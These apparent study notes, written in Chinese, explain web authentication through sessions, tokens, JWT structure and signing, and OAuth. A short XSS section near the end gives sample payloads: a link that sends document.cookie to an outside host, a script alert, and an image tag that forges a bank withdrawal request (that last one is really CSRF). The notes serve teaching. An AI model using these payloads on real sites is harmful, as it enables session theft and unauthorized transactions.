[TOC]

# 鉴权方式

+ 基于cookie的session
  + 身份权限信息存储在服务端中(形式：Session对象)
  + 客户端存储一条cookie，与一个服务端的session对象对应。
  + 每次请求服务端通过获取客户端cookie对应的session对象并校验来判断权限。
+ token
  + 身份权限信息存储在客户端(形式：随机字符串)
  + token字符串由服务端生成，并存储在客户端。
  + 每次请求服务端对客户端携带的token进行校验来判断权限。
+ OAuth

# session形式

原理图

![avatar](<https://raw.githubusercontent.com/leaftogo/img/master/auth_2.png>)

+ 这里的sid表示的意思是session_id，服务端的cookie中仅保存sid，而sid对应的session对象保存在服务端中

  不同服务器环境，sid的具体命名不一样。

+ servlet中使用的session一般是javax.servlet.http.HttpSession

  + 图中的2，3，5，6由tomcat实现了，需要开发者实现的服务端逻辑仅有7和8

+ 步骤3中的Cookie为服务器自动生成的，它的maxAge属性一般为-1，表示仅当前浏览器内有效，并且各浏览器窗口间不共享，关闭浏览器就会失效。因此同一机器的两个浏览器窗口访问服务器时，会生成两个不同的Session。但是由浏览器窗口内的链接、脚本等打开的新窗口（也就是说不是双击桌面浏览器图标等打开的窗口）除外。这类子窗口会共享父窗口的Cookie，因此会共享一个Session。

+ 任何session机制的实现都需要对session设置失效||过期条件。(想想session不会过期会发生什么？)

  + javax.servlet.http.HttpSession的失效条件
    + 1.连续空闲时间大于tomcat的web.xml中设置的session的超时值
    + 2.调用httpSession.setMaxInactiveInterval(int time)设置session的最大空闲时间，time参数单位:秒
    + 3.调用httpSession.invalidate()
    + 4.关闭浏览器
    + 优先级依次递增

+ 客户端不支持cookie的情况

  + 通过URL重写来解决
  + 原理：将session_id重写到url地址中。

+ session的弊端：

  + session存储在服务端内存中，需要注意内存存储的问题。如果每个用户的session占用100K，有10000个用户活跃，就占用了1G的内存。

  + 如果web服务器发生了重启(tomcat重启)，那么所有session将全部丢失，用户可能会全部退出登录。甚至可能会导致更严重的逻辑问题：

    购买东西：下订单，扣款，设置订单未支付变为已支付。

    订单执行状态会记录在session中。

    扣完款之后服务器重启session丢失，导致扣了款但订单仍然未支付。

    这实际上是信息未持久化导致的逻辑问题。

# Token

原理图：

- ![avatar](<https://raw.githubusercontent.com/leaftogo/img/master/auth_1.png>)

- token在客户端的存储方式可以是cookie，可以是localstorage。不能直接存在页面的js变量中。

- 服务端只会对客户端请求所携带的token进行校验，而不关心客户端的请求地点(请求ip)，请求时间，是否登陆过等等其他的状态。

- token需要设定合理地过期时间

  + 事实上，你也可以让token永不过期，但那样不安全。

- token机制和session机制的一些区别：

  + session存储在服务端，token存储在客户端。

  + session可能会因为服务器重启丢失导致权限认证失效，但服务器重启不会影响token的权限的有效性。
  + session和token都有过期时间。

+ token逻辑的实现：
  + 自己实现
  + JWT

# JWT

<https://jwt.io/>

这是一个jwt示例

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

jwt的形式为

```
Header+"."+Payload+"."+Signature
```

+ Header，Payload，Signature分别为三个字符串，它们之间用两个"."连接起来

+ Header

  + Header的组成为：base64(json)，是对一条json字符串的base64处理之后生成的字符串

  + Header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）

    例如：

    ```
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```

    将其base64处理后得到

    ```
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
    ```

    这就是Header

+ Payload

  + Payload的组成：base64(json)，和Header一样，也是对一条json字符串的base64处理之后生成的字符串

  + 这是一个Payload的例子

    ```
    {
      "sub": "1234567890",
      "name": "John Doe",
      "iat": 1516239022
    }
    ```

    将其base64处理后得到

    ```
    eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
    ```

    这就是Payload

  + 现在介绍Payload中的键值对可以有哪些key和value，分别有哪些含义

    + payload包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。

      

    + Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。

    + Public claims : 可以随意定义。

    + Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。

    + 在上面的示例

      ```
      {
        "sub": "1234567890",   //是一个registered claims
        "name": "John Doe",    //是一个自定义claims
        "iat": 1516239022      //很明显这是一个时间戳，这是一个预定义声明，表示这个签名是在什么时间生成的
      }
      ```

+ Signature

  + Signature在组成上等价于        encrypt(string,secret)

    这里的encrypt()表示一个加密算法，它与Header中声明的alg一样

    ```
    {
      "alg": "HS256",    //表示这里使用的是HS256加密算法
      "typ": "JWT"
    }
    ```

    它的两个参数：

    + secret是这个加密算法的密钥，它是由服务端提前设定好的，只有服务开发者持有，不对外公开。

    + string等于：base64UrlEncode(header) + "." + base64UrlEncode(payload)

    ​                          即Header，Payload分别经过base64处理后用"."连接起来

    

    encrypt(base64UrlEncode(header) + "." + base64UrlEncode(payload),secret)

  + Signature的意义，为什么在这里要加密一下Header和Payload？

    1. Signature是用于验证消息在传递过程中有没有被更改，如果被更改过了，那么校验jwt的时候将无法通过jwt的Header和Payload生成和Signature一样的签名。
    2. 对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。如果你的签名密钥足够复杂并且只有你自己持有。

+ jwt的验证方式以及相应的作用

  1. 通过jwt中的Header和Payload计算出一个Signature并与jwt中的Signature进行比较验证jwt是否被更改过以及jwt的发送方是否是它所称的发送方。

     如果一样说明jwt没有更改过，不一样说明更改过。

  2. jwt中可以保存jwt的签发时间和jwt的过期时间(payload的自定义claims)

     如果jwt中的签发时间和jwt的过期时间被攻击者更改了？参照1.

  3. payload中还可以存有有关用户的信息，比如用户的id，用户的身份权限，通过检验这里来判断用户的身份权限是否满足接口要求。

     权限信息被篡改的情况参照1.

+ 如何使用JWT，参照代码。

+ jwt不合法抛的异常

+ ```
  com.auth0.jwt.exceptions.TokenExpiredException: The Token has expired on Sat Apr 20 20:35:45 CST 2019.
  ```

+ 

+ ```
  <dependency>
  			<groupId>com.auth0</groupId>
  			<artifactId>java-jwt</artifactId>
  			<version>3.4.1</version>
  </dependency>
  ```

# OAuth

这篇文章讲的挺好的。

<https://www.cnblogs.com/flashsun/p/7424071.html>

![avatar](<https://raw.githubusercontent.com/leaftogo/img/master/auth_3.png>)



​      

### XSS

```
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>

<script>alert('xss appears');</script>

<img  src = "http://www.bank.com/withdraw?user=ccz&amount=23333&type=rmb&Xfor=leaf">

银行将认证信息保存在cookie中，并且cookie尚未过期，那么浏览器尝试加载该图片,将使用用户的cookie提交提款表单，从而在未经用户许可的情况下进行交易。
```



# cookie

<https://www.cnblogs.com/zhuanzhuanfe/p/8010854.html>

http://tool.oschina.net/commons?type=2

https://github.com/leaftogo/authteach



https://www.cnblogs.com/zhuanzhuanfe/p/8010854.html

<https://jwt.io/>